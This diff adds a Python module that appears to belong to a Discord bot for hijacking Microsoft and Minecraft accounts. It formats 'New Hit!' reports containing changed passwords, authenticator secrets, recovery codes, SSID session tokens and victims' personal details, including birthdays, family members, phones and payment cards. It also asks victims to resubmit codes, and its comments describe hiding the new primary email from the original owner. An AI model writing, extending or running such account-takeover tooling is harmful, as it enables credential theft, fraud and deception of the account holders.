@@ -1,0 +1,419 @@
+from minecraft.get_hypixel import get_hypixel_stats
+from minecraft.get_donut import donut_money, get_donut_stats
+from shared.simplify import simplify
+
+from urllib.parse import quote
+from discord import Embed
+import time
+
+
+_ABUSE_USER_REASON = (
+    "Microsoft flagged this session (unusual activity). "
+    "Nothing was changed — submit the code again in a few minutes."
+)
+
+
+def public_secure_reason(reason: str | None, *, error: str | None = None) -> str:
+    """Short Discord-safe failure text — never Microsoft HTML or stack dumps."""
+    text = str(reason or error or "").strip()
+    if "snippet=" in text:
+        text = text.split("snippet=", 1)[0].strip()
+    # Drop leftover HTML if a page body leaked in
+    for marker in ("<!DOCTYPE", "<!-- Copyright", "<html", "<head"):
+        idx = text.find(marker)
+        if idx >= 0:
+            text = text[:idx].strip()
+            break
+    low = text.lower()
+    if (
+        "/abuse" in low
+        or "unusual-activity" in low
+        or "unusual activity" in low
+        or "abuse lock" in low
+        or "abuse/unusual" in low
+    ):
+        return _ABUSE_USER_REASON
+    text = " ".join(text.split())
+    if len(text) > 220:
+        text = text[:220].rstrip() + "…"
+    return text or "Securing failed. Please try again."
+
+
+def _clean(value: object, fallback: str = "N/A") -> str:
+    text = str(value or "").strip()
+    if not text or text in {"Couldn't Change!", "Unknown", "?"}:
+        return fallback
+    # Keep one-line copy format intact
+    return " ".join(text.split())
+
+
+def format_credential_line(
+    *,
+    email: str = "",
+    recovery: str = "",
+    password: str = "",
+    security_email: str = "",
+    username: str = "",
+) -> str:
+    """Single copy-paste line: email recovery password security_email username."""
+    return " ".join(
+        [
+            _clean(email),
+            _clean(recovery),
+            _clean(password),
+            _clean(security_email),
+            _clean(username),
+        ]
+    )
+
+
+def add_credential_line_field(
+    embed: Embed,
+    *,
+    email: str = "",
+    recovery: str = "",
+    password: str = "",
+    security_email: str = "",
+    username: str = "",
+) -> Embed:
+    line = format_credential_line(
+        email=email,
+        recovery=recovery,
+        password=password,
+        security_email=security_email,
+        username=username,
+    )
+    embed.add_field(
+        name="Copy",
+        value=f"```{line}```",
+        inline=False,
+    )
+    return embed
+
+
+def build_failure_embed(
+    email: str,
+    ms: dict,
+    reason: str,
+    *,
+    error: str | None = None,
+    credentials_changed: bool = False,
+) -> Embed:
+    """Failure DM/embed. ``email`` is the submitted/original address.
+
+    When primary alias was already replaced, ``ms["email"]`` is the new primary
+    (sunny@…). On give-back failures we must surface that — the old address may
+    already be deleted. Success seller embeds still hide sunny separately.
+    """
+    detail = public_secure_reason(error or reason)
+    reason = public_secure_reason(reason)
+    original = _clean(ms.get("original_email") or email, fallback=email)
+    primary_raw = str(ms.get("email") or "").strip()
+    primary_ok = bool(
+        primary_raw
+        and primary_raw not in {"Couldn't Change!", "Unknown", "?"}
+        and primary_raw.lower() != original.lower()
+    )
+    # Login email for copy line: prefer new primary when alias already changed
+    login_email = primary_raw if primary_ok else original
+
+    if credentials_changed:
+        desc = (
+            f"{reason}\n\n"
+            "Password / security email were already changed. "
+            "Use the credentials below to sign back in."
+        )
+        if primary_ok or ms.get("primary_alias_replaced") is True:
+            desc += (
+                "\n\n**Login with the new primary email below** — "
+                "the original Outlook alias was removed and will not work."
+            )
+        embed = Embed(
+            title="Account returned — save new credentials",
+            description=desc,
+            color=0xFA4343,
+        )
+    else:
+        embed = Embed(
+            title="Failed to secure account",
+            description=reason,
+            color=0xFA4343,
+        )
+    # Never dump RuntimeError / HTML into Discord. Skip Error when it duplicates.
+    if detail and detail != reason and "snippet=" not in detail:
+        embed.add_field(name="Error", value=f"```{detail[:280]}```", inline=False)
+    embed.add_field(name="Original Email", value=f"```{original}```", inline=True)
+    embed.add_field(
+        name="Login Email (primary)",
+        value=f"```{login_email}```",
+        inline=True,
+    )
+    if credentials_changed:
+        if ms.get("security_email") and ms["security_email"] != "Couldn't Change!":
+            embed.add_field(name="Security Email", value=f"```{ms['security_email']}```", inline=False)
+        if ms.get("password") and ms["password"] != "Couldn't Change!":
+            embed.add_field(name="Password", value=f"```{ms['password']}```", inline=True)
+        if ms.get("recovery_code") and ms["recovery_code"] != "Couldn't Change!":
+            embed.add_field(name="Recovery Code", value=f"```{ms['recovery_code']}```", inline=False)
+        auth = str(ms.get("auth_secret") or "").strip()
+        if auth and auth not in ("Disabled", "Couldn't Change!", "Failed", "None", "?"):
+            embed.add_field(name="Authenticator Secret", value=f"```{auth}```", inline=False)
+        add_credential_line_field(
+            embed,
+            email=login_email,
+            recovery=ms.get("recovery_code", ""),
+            password=ms.get("password", ""),
+            security_email=ms.get("security_email", ""),
+            username=ms.get("username") or ms.get("mc_name") or "",
+        )
+        embed.set_footer(text="Save these credentials — the password was already changed.")
+    else:
+        if ms.get("recovery_code") and ms["recovery_code"] not in (
+            "Couldn't Change!",
+            "Unknown",
+            "?",
+            "Failed to generate",
+        ):
+            embed.add_field(
+                name="Original Recovery Code",
+                value=f"```{ms['recovery_code']}```",
+                inline=False,
+            )
+            embed.set_footer(text="Credentials were NOT changed — original recovery code should still work.")
+        else:
+            embed.set_footer(
+                text="Nothing was changed. Original email / password / OTP still work — submit the code again."
+            )
+    return embed
+
+
+def _field(obj: dict, *keys: str, default: str = "Unknown") -> str:
+    for key in keys:
+        val = obj.get(key)
+        if val not in (None, ""):
+            return str(val)
+    return default
+
+
+async def build_account_embeds(account: dict, elapsed: float = 0, account_id: str = "") -> dict:
+    mc = account.get("minecraft", {})
+    name = quote(mc.get("name") or "Unknown")
+
+    ms = account["microsoft"]
+    family = ms["family"]
+    devices = ms["devices"]
+    cards = ms["cards"]
+    subs = ms["subscriptions"]
+    phones = ms.get("phones", [])
+
+    active_subs = [(s, "Active") for s in subs["active"]]
+    canceled_subs = [(s, "Canceled") for s in subs["canceled"]]
+    commercial_subs = [(s, "Commercial") for s in subs["commercial"]]
+
+    all_subs = active_subs + canceled_subs + commercial_subs
+
+    info_embed = Embed(title="Extra Info", color=0x5865F2)
+    info_embed.add_field(name="First Name", value=f"```{ms['firstName']}```", inline=True)
+    info_embed.add_field(name="Last Name", value=f"```{ms['lastName']}```", inline=True)
+    info_embed.add_field(name="Full Name", value=f"```{ms['fullName']}```", inline=False)
+    info_embed.add_field(name="Region", value=f"```{ms['region']}```", inline=True)
+    info_embed.add_field(name="Birthday", value=f"```{ms['birthday']}```", inline=True)
+    info_embed.add_field(name="Language", value=f"```{ms['language']}```", inline=True)
+
+    family_embed = Embed(title=f"Family Members ({len(family)})", color=0x5865F2)
+    if family:
+        for key, member in enumerate(family, 1):
+            family_embed.add_field(
+                name=f"Member {key}", 
+                value=f"```{_field(member, 'display', 'name')}\n{_field(member, 'email')}\nRole: {_field(member, 'role')}```", 
+                inline=True
+            )
+    else:
+        family_embed.description = "This account doesn't belong to a family."
+
+
+    devices_embed = Embed(title=f"Devices ({len(devices)})", color=0x5865F2)
+    if devices:
+        for key, device in enumerate(devices, 1):
+            devices_embed.add_field(
+                name=f"Device {key}", 
+                value=f"```{_field(device, 'model')}\n{_field(device, 'name')}```",
+                inline=True
+            )
+    else:
+        devices_embed.description = "```There are no devices connected.```"
+
+    # List all cards
+    cards_embed = Embed(title=f"Payment Cards ({len(cards)})", color=0x5865F2)
+    if cards:
+        for key, card in enumerate(cards, 1):
+            cards_embed.add_field(
+                name=f"Card {key}",
+                value=f"```{_field(card, 'paymentMethodType')} *{_field(card, 'lastFourDigits', default='????')}\nExpiry: {_field(card, 'expirationDate', default='N/A')}```",
+                inline=True
+            )
+    else:
+        cards_embed.description = "```No payment cards.```"
+
+    phones_embed = Embed(title=f"Phones ({len(phones)})", color=0x5865F2)
+    if phones:
+        for key, phone in enumerate(phones, 1):
+            phones_embed.add_field(
+                name=f"Phone {key}",
+                value=f"```{_field(phone, 'phone')}\n{_field(phone, 'id')}```",
+                inline=True
+            )
+    else:
+        phones_embed.description = "```No phones associated.```"
+
+    subscriptions_embed = Embed(title=f"Subscriptions ({len(all_subs)})", color=0x5865F2)
+    if all_subs:
+        for key, (sub, status) in enumerate(all_subs, 1):
+            subscriptions_embed.add_field(
+                name=f"Sub {key}",
+                value=f"```{status}\n{_field(sub, 'productName', 'title', 'name', 'offerName', 'productTitle', 'friendlyName')}```",
+                inline=True
+            )
+    else:
+        subscriptions_embed.description = "```No subscriptions.```"
+
+    try:
+        hstats = await get_hypixel_stats(name)
+    except Exception:
+        hstats = {}
+    if not isinstance(hstats, dict):
+        hstats = {}
+    try:
+        dstats = await get_donut_stats(name)
+    except Exception:
+        dstats = "Failed"
+
+    stats_embed = Embed(color=0x279CF5)
+    stats_embed.add_field(name="Rank", value=f'{hstats.get("hypixel", {}).get("rank", "N/A")}', inline=True)
+    stats_embed.add_field(name="Hyp LVL", value=f'{simplify(hstats.get("hypixel", {}).get("level", 0))}', inline=True)
+    stats_embed.add_field(name="Gifted", value=f'{hstats.get("hypixel", {}).get("gifted", 0)}', inline=True)
+    stats_embed.add_field(name="SB NW", value=f'${simplify(hstats.get("skyblock", {}).get("networth", 0))}', inline=True)
+    stats_embed.add_field(name="SB LVL", value=f'{simplify(hstats.get("skyblock", {}).get("level", 0))}', inline=True)
+    stats_embed.add_field(name="Donut NW", value=f'{simplify(donut_money(dstats))}', inline=True)
+
+    xbox_embed = Embed(color=0x107C10, title="Xbox Info")
+    xbox_embed.add_field(name="Gamertag", value=f"```{mc.get('gamertag', 'Not Found')}```", inline=False)
+
+    hit_embed = Embed(
+        title=f"New Hit! Secured in {round(elapsed, 2)}s",
+        description=(
+            "[Login](https://login.live.com/) | "
+            "[Donut](https://www.donutstats.net/player-finder) | "
+            f"[SkyCrypt](https://sky.shiiyu.moe/stats/{name}) | "
+            f"[Plancke](https://plancke.io/hypixel/player/stats/{name}) | "
+            f"[Is Online](https://hypixel.paniek.de/player/{name}/status)"
+        ),
+        color=0x279CF5
+    )
+    hit_embed.add_field(name="MC Username", value=f"```{mc.get('name', 'No Minecraft')}```", inline=False)
+    hit_embed.add_field(name="MC Method", value=f"```{mc.get('method', 'Unknown')}```", inline=True)
+    hit_embed.add_field(name="MC Capes", value=f"```{mc.get('capes', 'No capes')}```", inline=True)
+    old_email = _clean(
+        ms.get("original_email") or ms.get("seller_email") or "",
+        fallback="",
+    )
+    new_email = _clean(ms.get("email"), fallback="N/A")
+    if old_email and old_email.lower() != new_email.lower():
+        hit_embed.add_field(name="Old Email", value=f"```{old_email}```", inline=True)
+        hit_embed.add_field(name="New Email (primary)", value=f"```{new_email}```", inline=True)
+    else:
+        # Alias replace failed or never ran — primary is still the submitted address
+        hit_embed.add_field(name="Old Email", value=f"```{old_email or new_email}```", inline=True)
+        hit_embed.add_field(
+            name="New Email (primary)",
+            value=f"```{new_email}```\n_Alias not replaced — same as old_",
+            inline=True,
+        )
+    hit_embed.add_field(name="Security Email", value=f"```{ms['security_email']}```", inline=False)
+    hit_embed.add_field(name="Password", value=f"```{ms['password']}```", inline=False)
+    hit_embed.add_field(name="Secret Key", value=f"```{ms['auth_secret']}```", inline=False)
+    hit_embed.add_field(name="Recovery Code", value=f"```{ms['recovery_code']}```", inline=False)
+    add_credential_line_field(
+        hit_embed,
+        email=new_email,
+        recovery=ms.get("recovery_code", ""),
+        password=ms.get("password", ""),
+        security_email=ms.get("security_email", ""),
+        username=mc.get("name") or mc.get("gamertag") or "",
+    )
+    if old_email and old_email.lower() != new_email.lower():
+        hit_embed.add_field(
+            name="Copy (old → new)",
+            value=f"```{old_email} → {new_email}```",
+            inline=False,
+        )
+    hit_embed.set_footer(text=f"{time.strftime('%d/%m/%y', time.localtime())}, {time.strftime('%H:%M', time.localtime())}")
+
+    # Seller-facing embed: NEVER expose the post-secure primary (sunny@…).
+    # Use original login email only; owners still get hit_embed above.
+    seller_email = (
+        ms.get("original_email")
+        or ms.get("seller_email")
+        or ms.get("email")
+        or ""
+    )
+    # If primary was replaced, keep seller view on the pre-change address
+    if ms.get("original_email"):
+        seller_email = ms["original_email"]
+    seller_embed = Embed(
+        title="Account secured",
+        description="Your sale completed. Save the security details below if this was returned to you.",
+        color=0x57F287,
+    )
+    seller_embed.add_field(name="Email", value=f"```{seller_email}```", inline=False)
+    seller_embed.add_field(name="Security Email", value=f"```{ms.get('security_email', 'N/A')}```", inline=True)
+    seller_embed.add_field(name="Password", value=f"```{ms.get('password', 'N/A')}```", inline=True)
+    seller_embed.add_field(name="Recovery Code", value=f"```{ms.get('recovery_code', 'N/A')}```", inline=False)
+    add_credential_line_field(
+        seller_embed,
+        email=seller_email,
+        recovery=ms.get("recovery_code", ""),
+        password=ms.get("password", ""),
+        security_email=ms.get("security_email", ""),
+        username=mc.get("name") or mc.get("gamertag") or "",
+    )
+
+    ssid_embed = Embed(
+        title="SSID"
+    )
+    if mc.get("SSID"):
+        ssid_embed.description = f"```{mc['SSID']}```"
+    else:
+        ssid_embed.description = "This account does not have a SSID."
+
+    if mc.get("SSID"):
+        hit_embed.set_thumbnail(url=f"https://mc-heads.net/avatar/{name}/128")
+
+    return {
+        "hit_embed": hit_embed,
+        "seller_embed": seller_embed,
+        "account_id": account_id,
+        "minecraft": mc,
+        "hstats": hstats,
+        "details": {
+            "stats_embed": stats_embed,
+            "ssid_embed": ssid_embed,
+            "info_embed": info_embed,
+            "xbox_embed": xbox_embed,
+            "family_embed": family_embed,
+            "devices_embed": devices_embed,
+            "cards_embed": cards_embed,
+            "subs_embed": subscriptions_embed,
+            "phones_embed": phones_embed,
+            "account_details": (
+                f"**Username:** {mc.get('name', 'No Minecraft')}\n"
+                f"**Has MC:** {bool(mc.get('SSID'))}\n"
+                f"**Capes:** {mc.get('capes', 'No capes')}\n"
+                f"**Old Email:** {ms.get('original_email') or ms.get('email')}\n"
+                f"**New Email (primary):** {ms['email']}\n"
+                f"**Security Email:** {ms['security_email']}\n"
+                f"**Password:** {ms['password']}\n"
+                f"**Recovery Code:** {ms['recovery_code']}"
+            )
+        }
+    }
